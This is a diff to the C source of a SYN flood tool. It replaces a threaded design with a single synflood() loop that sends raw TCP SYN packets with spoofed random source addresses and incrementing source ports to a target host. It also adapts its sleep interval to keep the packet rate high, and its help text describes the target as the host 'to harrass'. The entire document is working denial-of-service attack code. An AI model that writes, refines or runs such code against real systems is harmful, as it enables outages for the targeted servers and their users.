@@ -16,8 +16,7 @@
 // signal handling
 #include <signal.h> 
 
-// multithreading / timing
-#include <pthread.h>
+// timing
 #include <time.h>
 
 // different flavors of IP header
@@ -27,26 +26,35 @@ typedef struct ip iph_t;
 typedef struct iphdr iph_t; 
 #endif
 
+// make sure we're sending lots of packets
+#define OVERFLOW_USLEEP_MAX (500000)    // 0.5s
+#define OVERFLOW_USLEEP_MIN (1000)      // 1ms
+#define OVERFLOW_RATE_MAX   (0.01)      // 1%
+#define OVERFLOW_RATE_MIN   (0.001)     // 0.1%
+
 // calculate header checksum
 unsigned short csum (unsigned short *ptr, int nbytes);
 
+// list of bad source address ranges
+#define BLACKLIST_SIZE 6
+struct iprange {
+    uint32_t from;
+    uint32_t to;
+};
+
+struct iprange * make_blacklist (void);
+
 // get an IP address for a hostname
 in_addr_t getip (char *hostname);
-in_addr_t randip (void);
+
+// get a random IP address
+in_addr_t randip (struct iprange *blacklist);
 
 // obtain and configure a socket
 int get_socket (void);
 
-// 
-void blacklist_init (void);
-
-// all of the dirty TCP / IP packet initialization in one amazing function
-void dgram_init (char *source_host, char *destination_host);
-
 // threading stuff
-void start_threads (void);
-void wait_for_interrupt (void);
-void* thread_go (void *arg);
+uint64_t synflood (in_addr_t dst_addr, unsigned short port);
 
 // handle a termination signal
 void onsignal (int sig);
@@ -57,6 +65,8 @@ void print_usage (FILE *fout, char *execname);
 // print title / info
 void print_title (void);
 
+// parse / validate command line arguments
+void parse_argv(int argc, char **argv, char **hostname, unsigned short *port);
 
 
 //
@@ -64,20 +74,7 @@ void print_title (void);
 //
 
 volatile int stop;      // flag to terminate program
-int nthreads;           // number of threads
-pthread_t *threads;     // threads
-
-in_addr_t dst_addr;     // destination address
-time_t tstart;          // start time
 int q;                  // quiet mode
-short port;             // destination port
-
-// list of bad source addresse ranges
-struct iprange {
-    uint32_t from;
-    uint32_t to;
-};
-struct iprange src_blacklist[5];
 
 
 /**
@@ -87,55 +84,10 @@ int main (int argc, char **argv)
 {   
 
     char *hostname = NULL;
-    port = 80;
+    unsigned short port = 80;
     q = 0;
-    int c;
-    while ( (c = getopt(argc, argv, "h:p:n:q?")) != -1 ) {
-        switch (c) {
-            case 'h':
-                hostname = optarg;
-                break;
-            case 'p':
-                port = atoi (optarg);
-                if (port == 0) {
-                    fprintf (stderr, "invalid port - " 
-                             "must be between 1 and 65535\n");
-                    return 1;
-                }
-                break;
-            case 'n':
-                nthreads = atoi (optarg);
-                if (nthreads == 0) {
-                    fprintf (stderr, "invalid thread number - " 
-                             "must be between 1 and 65535\n");
-                    return 1;
-                }
-                break;
-            case 'q':
-                q = 1;
-                break;
-            case '?':
-                print_usage (stdout, argv[0]); 
-                printf ("\n"
-                        "options: \n"
-                        "  -h  hostname     the hostname / ip address to "
-                                           "harrass\n"
-                        "  -p  port         the port to connect to. "
-                                           "defaults to 80.\n"
-                        "  -n  nthreads     number of threads to use " 
-                                           "(1-65535). defaults to number of " 
-                                            "cpus. \n");
-                break;
-            default:
-                print_usage (stderr, argv[0]);
-                return 1;
-        }
-    }
 
-    if (hostname == NULL) {
-        print_usage (stderr, argv[0]);
-        return 1;
-    }
+    parse_argv (argc, argv, &hostname, &port);
 
     if (!q) {
         print_title ();
@@ -143,16 +95,45 @@ int main (int argc, char **argv)
     }
 
     // lookup destination address
-    dst_addr = getip (hostname);
+    in_addr_t dst_addr = getip (hostname);
 
-    // setup IP data
-    blacklist_init ();
+    // exit signals
+    stop = 0;
+    signal (SIGINT, onsignal);
+    signal (SIGTERM, onsignal);
 
+    // start the timer
+    time_t tstart = time (NULL);
+
+    //
     // run
-    // start_threads ();
+    //
+    uint64_t count = synflood (dst_addr, port);
 
     // wait for signal
-    // wait_for_interrupt ();
+
+    // just do time in seconds. 
+    // not too accurate...
+    time_t exec_time = time (NULL) - tstart;
+    if (exec_time == 0) {
+        exec_time = 1;
+    }
+    uint64_t packets_per_sec = count / exec_time;
+
+#ifdef __APPLE__ 
+    // mac: complains if not formatted as unsigned long long 
+    #define LLU_FMT "%llu"
+#else
+    // linux: complains if not formatted long unsigned
+    #define LLU_FMT "%lu"
+#endif
+    
+    if (!q) {
+        // print number of sent packets and packets per second
+        printf ("sent " LLU_FMT " packets (" LLU_FMT " packets / second)\n",
+                count, 
+                packets_per_sec);
+    }
 }
 
 
@@ -184,12 +165,60 @@ void print_title (void) {
 
 
 /**
+ * parse / validate command line arguments
+ */
+void parse_argv (int argc, char **argv, char **hostname, unsigned short *port) {
+    int c;
+    while ( (c = getopt(argc, argv, "h:p:q?")) != -1 ) {
+        switch (c) {
+            case 'h':
+                *hostname = optarg;
+                break;
+            case 'p':
+                *port = atoi (optarg);
+                if (*port == 0) {
+                    fprintf (stderr, "invalid port - " 
+                             "must be between 1 and 65535\n");
+                    exit (EXIT_FAILURE);
+                }
+                break;
+            case 'q':
+                q = 1;
+                break;
+            case '?':
+                print_usage (stdout, argv[0]); 
+                printf ("\n"
+                        "options: \n"
+                        "  -h  hostname     the hostname / ip address to "
+                                           "harrass\n"
+                        "  -p  port         the port to connect to. "
+                                           "defaults to 80.\n"
+                        "  -q  quiet        don't print anything.\n"
+                       );
+                break;
+            default:
+                print_usage (stderr, argv[0]);
+                exit (EXIT_FAILURE);
+        }
+    }
+
+    if (*hostname == NULL) {
+        print_usage (stderr, argv[0]);
+        exit (EXIT_FAILURE);
+    }
+}
+
+
+/**
  * initialize list of invalid source IP ranges
  */
-void blacklist_init (void) {
+struct iprange * make_blacklist (void) {
     #define BLACKLIST(a0,b0,c0,d0, a1,b1,c1,d1) \
-        src_blacklist[i].from = ((a0 << 24)|(b0 << 16)|(c0 << 8)|d0);\
-        src_blacklist[i++].to = ((a1 << 24)|(b1 << 16)|(c1 << 8)|d1)
+        blacklist[i].from = ((a0 << 24)|(b0 << 16)|(c0 << 8)|d0);\
+        blacklist[i++].to = ((a1 << 24)|(b1 << 16)|(c1 << 8)|d1)
+
+    struct iprange * blacklist = malloc (BLACKLIST_SIZE * 
+                                         sizeof (struct iprange));
 
     int i = 0;
     BLACKLIST(  0,  0,  0,  0,    0,255,255,255);
@@ -198,6 +227,7 @@ void blacklist_init (void) {
     BLACKLIST(198, 51,100,  0,  198, 51,100,255);
     BLACKLIST(203,  0,113,  0,  203,  0,113,255);
     BLACKLIST(239,  0,  0,  0,  255,255,255,255);
+    return blacklist;
 } 
 
 
@@ -315,74 +345,20 @@ in_addr_t getip (char *hostname) {
 /**
  * generate a random IPV4 address
  */
-in_addr_t randip () {
+in_addr_t randip (struct iprange *blacklist) {
     char data[16];
     
     int r;
+
     try_addr: 
     r = rand();
-    for (int i = 0; i < 5; ++i) {
-        if (r >= src_blacklist[i].from && r <= src_blacklist[i].to) {
+    for (int i = 0; i < BLACKLIST_SIZE; ++i) {
+        if (r >= blacklist[i].from && r <= blacklist[i].to) {
             goto try_addr;
         }
     }
-    
-    sprintf (data, "%d.%d.%d.%d",
-             (r >> 24) & 0xff,
-             (r >> 16) & 0xff,
-             (r >>  8) & 0xff, 
-             (r >>  0) & 0xff);
-    return inet_addr (data);
-}
 
-
-/**
- * start the threads. attempts to detect number of processors to start 1 per 
- * core. if that fails, it just starts 1 thread
- */
-void start_threads () {
-    
-    if (nthreads == 0) {
-        nthreads = sysconf (_SC_NPROCESSORS_ONLN);
-        // _SC_NPROCESSORS_ONLN is a nonstandard posix extension
-        // may fail, return -1
-        // however it supposedly works on Mac, Cygwin
-        if (nthreads <= 0) {
-            if (!q) {
-                printf ("unable to detect CPU count. Setting to 1\n");
-            }
-            nthreads = 1;
-        }
-    }
-
-    threads = malloc (nthreads * sizeof (pthread_t));
-    if (!threads) {
-        if (!q) {
-            fprintf (stderr, "out of memory!\n");
-        }
-        exit (1);   
-    }
-
-    stop = 0;
-
-    tstart = time (NULL);
-    for (int i = 0; i < nthreads; ++i) {
-        pthread_attr_t attrs;  
-        pthread_attr_init(&attrs);
-        pthread_attr_setdetachstate(&attrs, PTHREAD_CREATE_JOINABLE);
-        errno = pthread_create (&threads[i], &attrs, thread_go, 
-                                NULL);
-        if (errno) {
-            if (!q) {
-                perror ("unable to spawn thread");
-            }
-            exit (EXIT_FAILURE);
-        }
-    }
-
-    if (!q) {
-        printf ("started %d threads\n", nthreads);
-    }
+    return htonl(r);
 }
 
 
@@ -391,22 +367,28 @@ void start_threads () {
  * each thread gets a socket, but reuses the SYN packet
  * returns the number of packets successfully sent
  */
-void* thread_go (void *arg) {
+uint64_t synflood (in_addr_t dst_addr, unsigned short port) {
+
+    // don't use these source addresses
+    struct iprange *blacklist = make_blacklist ();
+
     int s = get_socket ();
     uint64_t count = 0;
     uint64_t buf_err_count = 0;
     uint64_t retry_count = 10;
-    int sleep_usec = 50000;
+    int sleep_usec = 10000;
 
     struct sockaddr_in addr;
     char datagram[4096];
     size_t ip_len;
     short seq = 0;
 
+    srand (time (NULL));
+
     while (!stop) {
 
         // spoof source ip
-        in_addr_t source_ip = randip ();
+        in_addr_t source_ip = randip (blacklist);
 
         //IP header
         iph_t *iph = (iph_t *) datagram;
@@ -456,7 +438,7 @@ void* thread_go (void *arg) {
          
         //TCP Header
 #ifdef __APPLE__
-        tcph->th_sport = htons (1234); // random source port
+        tcph->th_sport = htons (++seq); // random source port
         tcph->th_dport = htons (80);
         tcph->th_seq = 0;
         tcph->th_ack = 0x0;
@@ -467,7 +449,7 @@ void* thread_go (void *arg) {
         tcph->th_sum = 0x0;             // IP stack fills this in
         tcph->th_urp = 0x0;
 #else 
-        tcph->source = htons (1234);   // random source port
+        tcph->source = htons (++seq);   // random source port
         tcph->dest = htons (80);
         tcph->seq = 0;
         tcph->ack_seq = 0;
@@ -500,11 +482,11 @@ void* thread_go (void *arg) {
          = csum( (unsigned short*) &csh , sizeof csh);
 
         // set ip_len
-        ip_len =
+        ip_len = iph->
 #ifdef __APPLE__
-        iph->ip_len;
+        ip_len;
 #else
-        iph->tot_len;   
+        tot_len;   
 #endif
 
         if (sendto (s,                  // socket 
@@ -523,17 +505,12 @@ void* thread_go (void *arg) {
                     // also, try to adjust sleep_usec so we don't have to sleep
                     // as often
                     double buf_err_rate = (double) buf_err_count / count;
-                    if (buf_err_rate > 0.001 && sleep_usec < 500000) {
+                    if (buf_err_rate > OVERFLOW_RATE_MAX && 
+                          sleep_usec < OVERFLOW_USLEEP_MAX) {
                         sleep_usec *= 2.5;
                         if (!q) {
                             printf ("frequent buffer overflow - "
                                     "chilling out more\n");
-                        }
-                    } else if (buf_err_rate < 0.0001 && sleep_usec > 10000) {
-                        sleep_usec /= 2.5;
-                        if (!q) {
-                            printf ("infrequent buffer overflow - "
-                                    "chilling out less\n");
                         }
                     }
                 }
@@ -561,51 +538,23 @@ void* thread_go (void *arg) {
             // success - reset retry_count and increment count
             retry_count = 0;
             ++count;   
+
+            if (count % 100000 == 0) {
+                // see if we can decrease our sleep window
+                double buf_err_rate = (double) buf_err_count / count;
+                if (buf_err_rate < OVERFLOW_RATE_MIN && 
+                      sleep_usec > OVERFLOW_USLEEP_MIN) {
+                    sleep_usec /= 2.5;
+                    if (!q) {
+                        printf ("infrequent buffer overflow - "
+                                "chilling out less\n");
+                    }
+                }
+            }
         }
     }
 
-    return (void*) count;
-}
-
-
-/**
- * block until an interrupt signal is received. then, print out some runtime 
- * info.
- */
-void wait_for_interrupt (void) {
-
-    signal (SIGINT, onsignal);
-    signal (SIGTERM, onsignal);
-    
-    // wait for each thread, then collect its count
-    uint64_t count = 0;
-    for (int i = 0; i < nthreads; ++i) {
-        void *retval;
-        pthread_join (threads[i], &retval);
-        count += * (uint64_t*) (&retval);
-    }
-
-    // just do time in seconds. not too accurate if you don't run it very long
-    time_t exec_time = time (NULL) - tstart;
-    if (exec_time == 0) {
-        exec_time = 1;
-    }
-    uint64_t packets_per_sec = count / exec_time;
-
-#ifdef __APPLE__ 
-    // mac: complains if not formatted as unsigned long long 
-    #define LLU_FMT "%llu"
-#else
-    // linux: complains if not formatted long unsigned
-    #define LLU_FMT "%lu"
-#endif
-    
-    if (!q) {
-        // print number of sent packets and packets per second
-        printf ("sent " LLU_FMT " packets (" LLU_FMT " packets / second)\n",
-                count, 
-                packets_per_sec);
-    }
+    return count;
 }
 
 
